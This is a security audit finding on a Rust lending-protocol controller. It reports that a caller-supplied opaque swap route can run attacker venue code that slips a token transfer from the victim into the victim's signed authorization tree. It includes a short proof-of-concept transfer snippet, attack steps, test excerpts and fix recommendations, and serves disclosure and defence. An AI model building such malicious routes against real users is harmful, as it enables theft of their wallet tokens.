### Title
Arbitrary route venue can inject unauthorized token transfers into the caller’s authorization tree - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
**Severity: High.** The controller accepts a caller-supplied opaque `swap` byte payload and forwards it to the configured swap router from `multiply`, `swap_debt`, `swap_collateral`, or `repay_debt_with_collateral`. Because route venue addresses are not constrained by the controller, a malicious route can place attacker-controlled contract code inside the transaction. That code can invoke `token.transfer(caller, attacker, amount)`, causing the transfer to appear as a child of the caller’s signed authorization tree. A victim who signs the poisoned tree loses unrelated wallet tokens even though the requested lending swap otherwise succeeds.

### Finding Description
`StrategySwap` is only raw `Bytes`; its semantics are defined entirely by the router rather than decoded or constrained by the controller. [1](#0-0) 

The public `swap_collateral` entrypoint accepts this payload directly as `swap: Bytes`. [2](#0-1)  The same pattern is exposed by `multiply`, `swap_debt`, and `repay_debt_with_collateral`. [3](#0-2) [4](#0-3) [5](#0-4) 

`swap_tokens` snapshots token balances, authorizes one exact controller-to-router input transfer, calls `router.execute_strategy(&controller, &amount_in, swap)`, and afterward checks only the controller’s measured input/output balances. [6](#0-5) [7](#0-6)  These checks bound the routed amount but do not prevent route-selected venue code from making a separate call that requires the external caller’s authorization.

The protocol’s own regression test demonstrates the issue: a router-selected pool calls `token::Client::transfer(&victim, &to, &amount)` from within `swap`. [8](#0-7)  During authorization recording, that unrelated wallet-token transfer is attached as a child of the victim’s `swap_collateral` invocation. [9](#0-8)  In enforcing mode, signing the recorded poisoned tree makes the transfer succeed and drains the victim’s unrelated token balance. [10](#0-9) 

### Impact Explanation
An attacker can steal any wallet token held by the victim, including tokens that are not listed by the lending protocol and are unrelated to the requested swap. The test moves an unrelated token balance of `77_770_000_000` units from Alice to the attacker while the protocol collateral swap still produces its expected output. [11](#0-10) [12](#0-11) 

The measured router-output check does not mitigate this because the malicious venue can still arrange acceptable swap output while performing the additional token transfer. The loss is therefore not limited to slippage, route quality, or the funds supplied to the strategy.

### Likelihood Explanation
The attack requires the victim to submit or sign a transaction containing a malicious `swap` payload and a poisoned authorization tree. This is plausible where route bytes and simulation results are produced by an application, API, or quote service and the wallet does not independently decode every venue address and authorization child.

No privileged role, leaked key, upgrade, or control of the victim’s account is required. The malicious venue address can be attacker-controlled, and the route payload is user input. If a client signs only the authorization tree returned by simulation, the extra token transfer is already included and will execute.

### Recommendation
- Decode and validate route payloads before presenting a transaction for signing.
- Reject route venue/pool addresses that are not expected for the selected operation and token pair.
- Reject any authorization tree containing token `transfer`, `approve`, or `transfer_from` children unrelated to the intended controller input transfer.
- Prefer routes whose venue contracts are explicitly allowlisted by the integrating client or protocol configuration.
- Wallets and SDKs should display every authorization child, especially calls transferring assets from the signer to an unrelated recipient.

### Proof of Concept
1. Alice owns a lending account with USDC collateral and holds an unrelated token `WALLET`.
2. The attacker deploys a malicious contract whose route-invoked function performs:
   ```rust
   token::Client::new(&env, &wallet_token)
       .transfer(&alice, &attacker, &wallet_balance);
   ```
   This is the same behavior demonstrated by `RogueHopPool::swap`. [8](#0-7) 
3. The attacker supplies a `swap` payload that routes through that contract while still returning enough of `new.asset` to satisfy the controller’s positive output check.
4. Alice calls:
   ```text
   swap_collateral(
       caller = alice,
       account_id = alice_account,
       current = USDC_hub_asset,
       amount = 5_000_USDC,
       new = ETH_hub_asset,
       swap = malicious_route
   )
   ```
5. Simulation records the malicious `WALLET.transfer(alice, attacker, wallet_balance)` beneath Alice’s `swap_collateral` authorization. [13](#0-12) 
6. Signing that tree transfers Alice’s entire unrelated wallet-token balance to the attacker while the collateral swap completes normally. [14](#0-13)

### Citations

**File:** common/src/types/shared.rs (L9-10)
```rust
/// Encoded swap route passed to the aggregator router's `execute_strategy` entry point.
pub type StrategySwap = Bytes;
```

**File:** contracts/controller/src/lib.rs (L225-237)
```rust
    fn multiply(
        env: Env,
        caller: Address,
        account_id: u64,
        spoke_id: u32,
        collateral: HubAssetKey,
        debt_to_flash_loan: i128,
        debt: HubAssetKey,
        mode: PositionMode,
        swap: Bytes,
        initial_payment: Option<(HubAssetKey, i128)>,
        convert_swap: Option<Bytes>,
    ) -> u64 {
```

**File:** contracts/controller/src/lib.rs (L258-276)
```rust
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_debt::process_swap_debt(
            &env,
            &caller,
            SwapDebtParams {
                account_id,
                existing_debt: &existing_debt,
                new_debt_amount: amount,
                new_debt: &new_debt,
                swap: &swap,
            },
```

**File:** contracts/controller/src/lib.rs (L283-301)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
```

**File:** contracts/controller/src/lib.rs (L311-321)
```rust
    fn repay_debt_with_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        collateral: HubAssetKey,
        collateral_amount: i128,
        debt: HubAssetKey,
        swap: Bytes,
        close_position: bool,
    ) {
        strategies::repay_debt_with_collateral::process_repay_debt_with_collateral(
```

**File:** contracts/controller/src/strategies/swap.rs (L24-38)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L20-22)
```rust
const SWAP_IN_USDC: i128 = 50_000_000_000; // 5 000 USDC, 7 decimals
const FAIR_OUT_ETH: i128 = 25_000_000; // 2.5 ETH at $2 000
const WALLET_BALANCE: i128 = 77_770_000_000; // Alice's balance of a token the protocol never listed
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-222)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L224-226)
```rust
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
